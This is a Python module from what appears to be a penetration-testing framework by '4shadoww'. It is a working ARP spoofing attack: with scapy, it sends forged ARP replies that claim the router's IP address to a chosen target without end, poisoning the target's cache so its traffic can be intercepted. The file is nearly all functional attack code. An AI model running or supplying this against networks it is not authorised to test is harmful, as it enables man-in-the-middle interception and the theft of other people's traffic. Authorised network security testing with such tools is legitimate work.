#		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
import sys
from core import colors
from collections import OrderedDict
import os
import subprocess
from scapy.all import *
from time import sleep

# Info about the module
# Module's name (should be same as file's name)
name = "arp_spoof"
# Module version
version = "1.0"
# Description
desc = "arp spoof"
# Creator's github
github = "4shadoww"
# Creator's name
createdby = "4shadoww"
# Email
email = "4shadoww0@gmail.com"
# Alert user if root permissions not available (remove variable below if root permissions not needed)
needroot = 1

# List of the variables
variables = OrderedDict((
('target', '192.168.1.3'),
('router', '192.168.1.1'),
))

# Description for variables
vdesc = [
'target ip address',
'router ip address',
]

# Additional help notes
help_notes = colors.red+"this module will not work without root permission!"+colors.end

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print (colors.blue + "[*]Setting Up ..." + colors.end)
	print(colors.green + "[OK]" + colors.end)
	sleep(1)
	print(colors.blue + "[*]ARP Poisoning Has Been Started ..." + colors.end)
	packet = ARP()
	packet.psrc = variables['router']
	packet.pdst = variables['target']
	while 1:
		send(packet, verbose=False)
		sleep(1)